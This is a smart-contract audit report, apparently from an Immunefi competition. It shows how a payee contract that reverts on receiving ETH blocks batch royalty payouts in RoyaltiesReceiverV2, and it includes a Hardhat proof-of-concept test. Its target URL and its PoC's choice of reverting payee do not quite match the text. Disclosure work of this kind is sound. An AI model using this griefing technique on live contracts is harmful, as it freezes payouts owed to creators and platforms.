# 57458 sc medium dos griefing in batch eth payout malicious payee receive can revert and block releaseall for all payees in royaltiesreceiverv2

* Submitted on Oct 26th 2025 at 11:41:35 UTC by @koko7 for Audit Comp | Belong: <https://immunefi.com/audit-competition/audit-comp-belong>
* Report ID: #57458
* Report Type: Smart Contract
* Report severity: Medium
* Target: <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/extensions/ReferralSystemV2.sol>
* Impacts:
  * Permanent freezing of unclaimed royalties

## Description

### Brief / Intro

In RoyaltiesReceiverV2, a payee contract can deliberately revert in its `receive()` or `fallback` so that a call to `releaseAll(NATIVE_CURRENCY_ADDRESS)` reverts. Because the batch loop does not isolate failures per payee, a single reverting payee causes the entire call to fail and no one is paid in that transaction. Funds are not lost (the transaction reverts), but batch ETH payouts can be blocked and operational processes disrupted.

### Vulnerability Details

* Batch entrypoint iterates payees and releases sequentially:

```solidity
function releaseAll(address token) external {
    RoyaltiesReceivers memory _royaltiesReceivers = royaltiesReceivers;
    _release(token, _royaltiesReceivers.creator);
    _release(token, _royaltiesReceivers.platform);
    if (_royaltiesReceivers.referral != address(0)) {
        _release(token, _royaltiesReceivers.referral);
    }
}
```

* ETH path in `_release` uses `safeTransferETH`, which reverts if the recipient’s `receive()`/`fallback` reverts:

```solidity
function _release(address token, address account) private {
    bool isNativeRelease = token == NATIVE_CURRENCY_ADDRESS;
    uint256 payment = _pendingPayment(isNativeRelease, token, account);
    if (payment == 0) return;

    Releases storage releases = isNativeRelease ? nativeReleases : erc20Releases[token];
    releases.released[account] += payment;
    releases.totalReleased += payment;

    if (isNativeRelease) {
        account.safeTransferETH(payment); // will revert if payee rejects ETH
    } else {
        token.safeTransfer(account, payment); // ERC20 path does not execute recipient code
    }
    emit PaymentReleased(token, account, payment);
}
```

* Error handling: there is no error isolation or best‑effort behavior; a single revert aborts the entire batch.
* Trust model: among the three payees (`creator`, `platform`, `referral`), the `referral` is typically the least‑trusted external party. A referral contract can intentionally revert to disrupt payouts even if it is technically able to accept ETH.

### Impact Details

* A single payee can block batch ETH payouts by reverting on receipt of ETH. This is a deliberate griefing vector, not an inability to receive ETH.
* The most likely adversary is a malicious `referral` payee seeking to disrupt operations, delay platform revenue, or block creator payouts.
* Consequences include blocked creator and platform payouts in the same call, and failures in automation that depends on batch releases. Operators may need to fall back to per‑payee releases or switch to an ERC20 payout path.
* Severity: Medium (liveness/operational DoS; no direct fund loss) with realistic adversary being the `referral` payee.

References:

* Code: `contracts/v2/periphery/RoyaltiesReceiverV2.sol` (`releaseAll`, `_release`)
* Transfer helper: Solady `SafeTransferLib.safeTransferETH`

## Proof of Concept (PoC)

<details>

<summary>PoC test (adds a reverting payee that blocks releaseAll for native ETH; ERC20 path still succeeds)</summary>

Add this test to `/home/jo/audit-comp-belong/test/v2/tokens/accessToken.test.ts` and run:

LEDGER\_ADDRESS=0x0000000000000000000000000000000000000001 PK=0x1000000000000000000000000000000000000000000000000000000000000001 npx hardhat test test/v2/tokens/accessToken.test.ts --grep "RoyaltiesReceiverV2: DoS on releaseAll via reverting payee"

```js
describe('RoyaltiesReceiverV2: DoS on releaseAll via reverting payee', () => {
  it('reverts releaseAll for native ETH when a payee reverts, but ERC20 path succeeds', async () => {
    const { factory, owner, creator, erc20Example, signer, referralCode } = await loadFixture(fixture);

    const RevertingPayee = await ethers.getContractFactory('RevertingPayee');
    const reverter = await RevertingPayee.deploy();
    await reverter.deployed();

    const newFactoryParams = {
      ...factoryParams,
      platformAddress: reverter.address,
    } as Factory.FactoryParametersStruct;

    await factory.setFactoryParameters(newFactoryParams, royalties, implementations, referralPercentages);

    const meta = { name: 'AtkETH', symbol: 'ATK', uri: 'contractURI/AtkETH' } as TokenMetadata;

    const { royaltiesReceiver: rr } = await deployAccessToken(
      meta,
      ethers.utils.parseEther('0.01'),
      ethers.utils.parseEther('0.005'),
      signer,
      creator,
      factory,
      referralCode,
    );

    const native = await rr.NATIVE_CURRENCY_ADDRESS();

    await owner.sendTransaction({ to: rr.address, value: ethers.utils.parseEther('1') });

    await expect(rr.connect(owner).releaseAll(native)).to.be.reverted;

    expect(await rr.totalReleased(native)).to.eq(0);
    expect(await rr.released(native, creator.address)).to.eq(0);
    expect(await rr.released(native, reverter.address)).to.eq(0);

    await erc20Example.connect(owner).mint(rr.address, ethers.utils.parseEther('1'));
    await expect(rr.connect(owner).releaseAll(erc20Example.address)).to.not.be.reverted;

    expect(await rr.totalReleased(erc20Example.address)).to.eq(ethers.utils.parseEther('1'));
    expect(await rr.released(erc20Example.address, creator.address)).to.eq(ethers.utils.parseEther('0.8'));
    expect(await rr.released(erc20Example.address, reverter.address)).to.eq(ethers.utils.parseEther('0.2'));
  });
});
```

</details>
